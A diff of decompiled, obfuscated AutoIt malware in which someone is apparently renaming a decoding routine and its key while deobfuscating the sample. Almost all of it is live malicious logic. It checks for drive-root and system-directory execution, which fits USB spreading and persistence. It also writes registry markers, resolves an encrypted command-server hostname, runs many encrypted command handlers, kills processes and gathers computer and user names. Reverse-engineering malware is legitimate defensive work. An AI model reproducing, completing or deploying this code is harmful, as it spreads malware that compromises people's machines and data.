+		Local $Local0014 = "--> IE.au3 " & $version[5] & " " & $Arg00 & " from function " & $Arg01
 		If Not String($ArgOpt02) = "" Then $Local0014 &= ", " & $ArgOpt02
 		If Not String($ArgOpt03) = "" Then $Local0014 &= " (" & $ArgOpt03 & ")"
 		ConsoleWrite($Local0014 & @CRLF)
@@ -1447,7 +1448,7 @@ $Var02DD = 0
 $Var02DE = 0
 $Var02EB = 0
 $Var02E1 = 0
-$Var032F = ""
+$EncryptionKey = ""
 $Var0330 = ""
 $Var0331 = ""
 $Var0332 = ""
@@ -1572,7 +1573,7 @@ If @ScriptDir = @SystemDir Then
 	EndIf
 	Fn00EB()
 	$Var033F = $Var0297 & "!" & $Var02A7
-	$Var033F = Fn00A8(1, $Var033F, $Var032F, 1)
+	$Var033F = Decrypt(1, $Var033F, $EncryptionKey, 1)
 	$Var02A8 = $Var02A7
 EndIf
 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
@@ -1606,17 +1607,17 @@ ElseIf @ScriptDir = @SystemDir Then
 		$Var0343 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
 		$Var0344 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
 		If $Var0343 <> $Var0344 Then
-			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
-			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
+			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
 		EndIf
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
 	EndIf
 	If FileExists(@ScriptDir & "\" & $Var0295) Then
 		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
 		$Var0345 = StringTrimLeft($Var0345, 1)
-		$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
+		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 		$Var0345 = StringSplit($Var0345, "!")
 		For $Var0346 = 1 To $Var0345[0]
 			If $Var0345[0] = 2 Then
@@ -1624,19 +1625,19 @@ ElseIf @ScriptDir = @SystemDir Then
 					$Var02A8 = $Var0345[2]
 					$Var02A7 = $Var0345[2]
 				Else
-					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
+					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
 				EndIf
 			Else
-				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
+				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
 			EndIf
 		Next
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
 	EndIf
 	If FileExists(@ScriptDir & "\" & $Var0294) Then
 		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
 		$Var0345 = StringTrimLeft($Var0345, 1)
-		$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
+		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 		$Var0345 = StringSplit($Var0345, "!")
 		For $Var0346 = 1 To $Var0345[0]
 			If $Var0345[0] = 2 Then
@@ -1644,14 +1645,14 @@ ElseIf @ScriptDir = @SystemDir Then
 					$Var02A8 = $Var0345[2]
 					$Var02A7 = $Var0345[2]
 				Else
-					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
+					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
 				EndIf
 			Else
-				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
+				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
 			EndIf
 		Next
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
+		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
 	EndIf
 Else
 	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
@@ -1692,8 +1693,8 @@ If @ScriptDir = @SystemDir Then
 	EndIf
 	If RegRead($Var029A, "exp1") <> "" Then
 	Else
-		RegWrite($Var029A, "exp1", "REG_SZ", Fn00A8(1, @YDAY * 1, $Var032F, 4))
-		RegWrite($Var029A, "dreg", "REG_SZ", Fn00A8(1, @YEAR * 1, $Var032F, 4))
+		RegWrite($Var029A, "exp1", "REG_SZ", Decrypt(1, @YDAY * 1, $EncryptionKey, 4))
+		RegWrite($Var029A, "dreg", "REG_SZ", Decrypt(1, @YEAR * 1, $EncryptionKey, 4))
 		RegWrite($Var029A, "fir", "REG_SZ", "x")
 	EndIf
 	$Var0347 = "http://www.whatismyip.com/automation/n09230945.asp"
@@ -1963,8 +1964,8 @@ Func Fn009C()
 		Fn00B8()
 		$Var0360 = RegRead($Var029A, "exp1")
 		$Var0361 = RegRead($Var029A, "dreg")
-		$Var0362 = Fn00A8(0, $Var0360, $Var032F, 4) + 0x000F
-		$Var0363 = Fn00A8(0, $Var0361, $Var032F, 4)
+		$Var0362 = Decrypt(0, $Var0360, $EncryptionKey, 4) + 0x000F
+		$Var0363 = Decrypt(0, $Var0361, $EncryptionKey, 4)
 		If $Var0362 * 1 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
 			Fn00EC()
 			$Var035F = Fn00B9($Var0339, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
@@ -2011,7 +2012,7 @@ Func Fn009C()
 			If $Var02DD = 0 Then
 				If @IPAddress1 <> "127.0.0.1" And @IPAddress1 <> "0.0.0.0" Then
 					TCPStartup()
-					$Var0364 = TCPNameToIP(Fn00A8(0, "408006571CB7BBE3DC1D7A5E0C45C5ABF2F90A9CB151D7C4BCBD1004419295F01C9134AD0EB273C35FCFFBF3EC34261C8624D15A1ED50CC986D48DD17A79649F", $Var032F, 2))
+					$Var0364 = TCPNameToIP(Decrypt(0, "408006571CB7BBE3DC1D7A5E0C45C5ABF2F90A9CB151D7C4BCBD1004419295F01C9134AD0EB273C35FCFFBF3EC34261C8624D15A1ED50CC986D48DD17A79649F", $EncryptionKey, 2))
 					TCPShutdown()
 					$Var0365 = 1
 					$Var0364 = StringSplit($Var0364, ".")
@@ -2024,13 +2025,13 @@ Func Fn009C()
 					$Var0367 = 0x0030
 					$Var0368 = 0
 					While 1
-						$Var0369 = Fn00A8(1, $Var0365, $Var0365, 0)
+						$Var0369 = Decrypt(1, $Var0365, $Var0365, 0)
 						$Var036A = Chr($Var0366)
 						$Var036B = Chr($Var0367)
 						$Var0366 = $Var0366 + 1
 						$Var0367 = $Var0367 + 1
 						$Var0365 = $Var0365 + 1
-						$Var036C = Fn00A8(1, $Var036A & $Var036B, $Var0369, 0)
+						$Var036C = Decrypt(1, $Var036A & $Var036B, $Var0369, 0)
 						$Var036D = StringLower($Var036C)
 						If $Var036D = "62d13aa0" Then $Var036D = "5eb149c0"
 						If $Var036D = "ffbfcf9b" Then $Var036D = "5eb149c0"
@@ -2068,7 +2069,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "aoksndoknhd6f14e635136d51v6b5n1g61"
 			$Var0372 = "9sgh51"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0373 = StringSplit($Var02C6, " ")
 			If $Var0373[0] = 3 Then
 				$Var0347 = $Var0373[1]
@@ -2106,7 +2107,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "VRXe"
 			$Var0372 = "VEgXx1013dx"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0374 = StringSplit($Var02C6, "@")
 			For $Var0350 = 1 To $Var0374[0]
 				$Var0375 = StringSplit($Var0374[$Var0350], "~")
@@ -2142,7 +2143,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "FHKJA6518GSEJdhjh65hhg4HTaekjb4hn6y1kkkjhj"
 				$Var0372 = "FHKJA6518GSEJdkkkjdfekjb4hn6y1kkkjhj"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var0373 = StringSplit($Var02C6, " ")
 				If $Var0373[0] = 2 Then
 					$Var02A0 = $Var0373[1]
@@ -2157,7 +2158,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "j6g54s6545L1H93JL57FG657H1"
 			$Var0372 = "Z95X1C3BN57M4HGF659FGH1"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0377 = StringSplit($Var02C6, "@")
 			For $Var0378 = 1 To $Var0377[0]
 				$Var0379 = 0
@@ -2209,7 +2210,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "Q9V7U2s4U9m1H5A6T7K5T4c15Wf9D5"
 			$Var0372 = "Z9Z9DE4df98h4G6H46df65g4F4444F"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var037F = StringSplit($Var02C6, "@")
 			For $Var0380 = 1 To $Var037F[0]
 				$Var0381 = StringSplit($Var037F[$Var0380], " ")
@@ -2297,7 +2298,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "Vx01"
 			$Var0372 = "Viz91"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0395 = StringSplit($Var02C6, "~")
 			For $Var0350 = 1 To $Var0395[0]
 				$Var0396 = StringInStr($Var0395[$Var0350], "/", 2, -1) + 1
@@ -2340,7 +2341,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "lJ3unI78hCE988eo87wt8cWET"
 			$Var0372 = "A0askdh8WDhoH111o8h8DW345"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0398 = StringSplit($Var02C6, "@")
 			For $Var0399 = 1 To $Var0398[0]
 				$Var039A = StringSplit($Var0398[$Var0399], " ")
@@ -2390,7 +2391,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "FAq9PKZr3vC6sdS4FJ8ker64V1Edf6DS54Fa6G4Kgg5Dr25"
 			$Var0372 = "A6SD54g984rhwhhswpd8581dsf681g6bn5146S1468d"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03A1 = StringSplit($Var02C6, "@")
 			For $Var03A2 = 1 To $Var03A1[0]
 				$Var03A3 = StringSplit($Var03A1[$Var03A2], " ")
@@ -2448,7 +2449,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "I9O87PKL654M3B32M9Z5XC1"
 			$Var0372 = "3Z2X1C9ZX51C7Z4X1CZ9X5C1"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0398 = StringSplit($Var02C6, "@")
 			For $Var0399 = 1 To $Var0398[0]
 				$Var039A = StringSplit($Var0398[$Var0399], "%")
@@ -2476,7 +2477,7 @@ Func Fn009C()
 						If $Var03B2 = $Var03B0 Then
 							$Var03AE = Random(1, $Var03A9, 1)
 							If $Var03AE = 1 Or $Var03AE = 0 Then
-								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $Var032F)
+								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $EncryptionKey)
 								If StringInStr($Var029B, "1;") Then
 									$Var029B = StringSplit($Var029B, ";")
 									If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
@@ -2526,7 +2527,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "7w7wq8T977T7TU9I7O3UI4P4IU"
 			$Var0372 = "9Z9X92Bb2B92h94H4K75J5Kj5n"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0398 = StringSplit($Var02C6, "@")
 			For $Var0399 = 1 To $Var0398[0]
 				$Var039A = StringSplit($Var0398[$Var0399], " ")
@@ -2618,7 +2619,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "9df51gftr1h19gh650gh5j6046j540fof0o4yu540f"
 			$Var0372 = "gf854h1t11h1r8601t08j90sd80ew0kty0j4tyj004"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0398 = StringSplit($Var02C6, "@")
 			For $Var0399 = 1 To $Var0398[0]
 				$Var039A = StringSplit($Var0398[$Var0399], " ")
@@ -2666,7 +2667,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "981NTY81KL1DF36DRG684F0080H94ERG498NMJ4SY9"
 			$Var0372 = "9DFG81R0Z1XC1BVN3651OUT51QW198C47651H9581"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0398 = StringSplit($Var02C6, "@")
 			For $Var0399 = 1 To $Var0398[0]
 				$Var039A = StringSplit($Var0398[$Var0399], " ")
@@ -2682,8 +2683,8 @@ Func Fn009C()
 						If $Var03AE = 1 Or $Var03AE = 0 Then
 							$Var0360 = RegRead($Var029A, "exp1")
 							$Var0361 = RegRead($Var029A, "dreg")
-							$Var0362 = Fn00A8(0, $Var0360, $Var032F, 4)
-							$Var0363 = Fn00A8(0, $Var0361, $Var032F, 4)
+							$Var0362 = Decrypt(0, $Var0360, $EncryptionKey, 4)
+							$Var0363 = Decrypt(0, $Var0361, $EncryptionKey, 4)
 							If $Var0362 * 1 + $Var03C3 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
 								If FileExists(@SystemDir & "\" & $Var0386) Then
 									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
@@ -2721,7 +2722,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "P4A9uK3i6I4V2V2VB1JH6jjjkk"
 			$Var0372 = "FD8dcn654F6J465h4fg698k9l9kh654jj"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03C4 = StringSplit($Var02C6, "~")
 			$Var03C5 = DllCall("kernel32.dll", "long", "GetTickCount")
 			$Var03C6 = $Var03C5[0]
@@ -2800,7 +2801,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "9a5sd19a5s1d3g5h7j"
 			$Var0372 = "gf854h1t11h1r8601t08s95d1gj65ko435er7"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var0398 = StringSplit($Var02C6, "@")
 			For $Var0399 = 1 To $Var0398[0]
 				$Var039A = StringSplit($Var0398[$Var0399], " ")
@@ -2856,7 +2857,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "KZ54777y"
 			$Var0372 = "xKw977"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03CE = @ComputerName
 			$Var03CF = @UserName
 			$Var03D0 = StringSplit($Var02C6, "~")
@@ -2885,11 +2886,11 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "Q7A4Z1W8S5X2E8D5C2R8F5V2"
 			$Var0372 = "9P6L3M8I5J2N7Y4G1V7T5J3M"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03D0 = StringSplit($Var02C6, "~")
 			$Var03B7 = $Var034A
 			If $Var03B7 <> "-1" Then
-				$Var03D2 = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $Var032F)
+				$Var03D2 = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $EncryptionKey)
 				If StringInStr($Var03D2, "1;") Then
 					$Var03D2 = StringSplit($Var03D2, ";")
 					If $Var03D2[0] = 4 Or $Var03D2[0] = 2 Then
@@ -2921,7 +2922,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "NN654X564BBV"
 			$Var0372 = "Z4N4X4M5V4C78BV"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03D3 = $Var034A
 			If $Var03D3 = "-1" Then
 			Else
@@ -2970,7 +2971,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "U15W1s"
 			$Var0372 = "u15wab"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03D9 = StringSplit($Var02C6, "~")
 			If $Var03D9[0] = 3 Then
 				$Var0385 = $Var03D9[1]
@@ -2996,7 +2997,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "N45ASDY4"
 			$Var0372 = "N7DK651O"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03DA = StringSplit($Var02C6, "@")
 			For $Var03DB = 1 To $Var03DA[0]
 				$Var03DC = StringSplit($Var03DA[$Var03DB], "~")
@@ -3049,7 +3050,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "llLLLGS436QWE6ZC654E6546FFSS9d8h7t"
 			$Var0372 = "Adgf45rwKJK87H883210BHhBH05BGFnbvg"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03DF = StringSplit($Var02C6, "~")
 			For $Var03E0 = 1 To $Var03DF[0]
 				If ProcessExists($Var03DF[$Var03E0]) Then
@@ -3067,7 +3068,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "D7G445SdxFDC"
 			$Var0372 = "KzDLzS5c47zSDN"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03E1 = StringSplit($Var02C6, "~")
 			For $Var03E2 = 1 To $Var03E1[0]
 				$Var03E3 = $Var03E1[$Var03E2]
@@ -3100,7 +3101,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "V8e74y"
 				$Var0372 = "Psj45a7scl"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var03E5 = StringSplit($Var02C6, "~")
 				If $Var03E5[0] = 2 Then
 					$Var03E6 = StringSplit($Var03E5[1], ".")
@@ -3128,7 +3129,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "D7G4SFDC"
 				$Var0372 = "KDLS547SDN"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var03D3 = $Var034A
 				If $Var03D3 <> "-1" Then
 					$Var03E7 = StringSplit($Var02C6, "@")
@@ -3160,7 +3161,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "P71DHJK5"
 				$Var0372 = "J8K61S54DPPLX"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var03D3 = $Var034A
 				If $Var03D3 <> "-1" Then
 					$Var03EC = StringSplit($Var02C6, "@")
@@ -3189,7 +3190,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "Xio90kK"
 				$Var0372 = "Z9031fLK"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var03F1 = StringSplit($Var02C6, "@")
 				For $Var03F2 = 1 To $Var03F1[0]
 					$Var03E5 = StringSplit($Var03F1[$Var03F2], "~")
@@ -3222,7 +3223,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "7Q5S3V9T5D1ZS464DFDSDF"
 				$Var0372 = "987ERT6D5F4G3C2V1B6D5F4G"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var03F3 = StringSplit($Var02C6, "@")
 				If Not @error Then
 					$Var03F4 = Random(1, $Var03F3[0], 1)
@@ -3254,7 +3255,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "H4D8D5U96581H3Y321VBNM1M1MBN"
 				$Var0372 = "LLFPD879S54D6B84654654CVBCVB654CVB654CB"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var029C = StringLen($Var02C6)
 				$Var02C4 = $Var02C6
 				$Var02BA = "_PE04E1B7463C3BD27"
@@ -3268,7 +3269,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "Ki8sdtPm4sQN1g2SBs321PTO4wVeU5"
 			$Var0372 = "AADSFsbDG4nh6hSDFweD6jSD16DD4w843Gn1"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03A1 = StringSplit($Var02C6, "@")
 			For $Var03A2 = 1 To $Var03A1[0]
 				$Var03F5 = StringSplit($Var03A1[$Var03A2], " ")
@@ -3311,7 +3312,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "C94D5DCB5FA4E879A1D216A4VD4S98RE8"
 			$Var0372 = "A951SDF1C5W67E9Q1AZX9F41SD4X"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03F8 = StringSplit($Var02C6, " ")
 			If $Var03F8[0] = 7 Then
 				$Var0322 = $Var03F8[1]
@@ -3365,7 +3366,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "9sd8f41q9w8ep1j87g3h52nb"
 			$Var0372 = "a987vdf74r4j33m1c4e"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var03FA = $Var02C6
 			$Var03FB = StringSplit($Var03FA, "@")
 			For $Var03FC = 1 To $Var03FB[0]
@@ -3395,7 +3396,7 @@ Func Fn009C()
 							If $Var0401 = $Var0400 Then
 								$Var03AE = Random(1, $Var03A9, 1)
 								If $Var03AE = 1 Or $Var03AE = 0 Then
-									$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $Var032F)
+									$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $EncryptionKey)
 									If StringInStr($Var029B, "1;") Then
 										$Var029B = StringSplit($Var029B, ";")
 										If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
@@ -3449,7 +3450,7 @@ Func Fn009C()
 		If $Var036F = 1 And $Var0370 = 1 Then
 			$Var0371 = "98uknm87l9p87zzx11v2d"
 			$Var0372 = "d8d700s198d4w1q1a11a1v3"
-			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 			$Var02C6 = StringSplit($Var02C6, "@")
 			For $Var0402 = 1 To $Var02C6[0]
 				$Var0403 = StringSplit($Var02C6[$Var0402], "%")
@@ -3479,7 +3480,7 @@ Func Fn009C()
 						If $Var0401 = $Var0400 Then
 							$Var03AE = Random(1, $Var03A9, 1)
 							If $Var03AE = 1 Or $Var03AE = 0 Then
-								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $Var032F)
+								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $EncryptionKey)
 								If StringInStr($Var029B, "1;") Then
 									$Var029B = StringSplit($Var029B, ";")
 									If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
@@ -3515,7 +3516,7 @@ Func Fn009C()
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "m9k5o1z7a5q3"
 				$Var0372 = "a65sd4m1n2b3"
-				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
+				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $EncryptionKey)
 				$Var02C6 = StringSplit($Var02C6, "~")
 				If $Var02C6[0] = 4 Then
 					$Var0324 = $Var02C6[1]
@@ -3614,7 +3615,7 @@ Func Fn009E()
 						If FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
 							$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $Var0293, 9)
 							$Var0345 = StringTrimLeft($Var0345, 1)
-							$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
+							$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 							$Var0345 = StringSplit($Var0345, "!")
 							For $Var0346 = 1 To $Var0345[0]
 								If $Var0345[0] = 2 Then
@@ -3708,7 +3709,7 @@ Func Fn009F()
 					If FileExists($Var0414[$Var0350] & "\" & $Var0293) Then
 						$Var0345 = FileReadLine($Var0414[$Var0350] & "\" & $Var0293, 9)
 						$Var0345 = StringTrimLeft($Var0345, 1)
-						$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
+						$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 						$Var0345 = StringSplit($Var0345, "!")
 						For $Var0346 = 1 To $Var0345[0]
 							If $Var0345[0] = 2 Then
@@ -3909,16 +3910,18 @@ Func Fn00A7($Arg00, $Arg01, $Arg02, $Arg03)
 	$Arg02 = StringInStr($Arg00, $Arg02)
 	$Var0423 = $Arg02 - $Arg01
 	$Var0424 = StringMid($Arg00, $Arg01, $Var0423)
-	$Var02C6 = Fn00A8(0, $Var0424, $Arg03, 2)
+	$Var02C6 = Decrypt(0, $Var0424, $Arg03, 2)
 	Return $Var02C6
 	$Var0424 = ""
 EndFunc
 
-Func Fn00A8($Arg00, $Arg01, $Arg02, $ArgOpt03 = 1)
+; $Arg01 string to decode
+; $Arg02 key
+Func Decrypt($Arg00, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
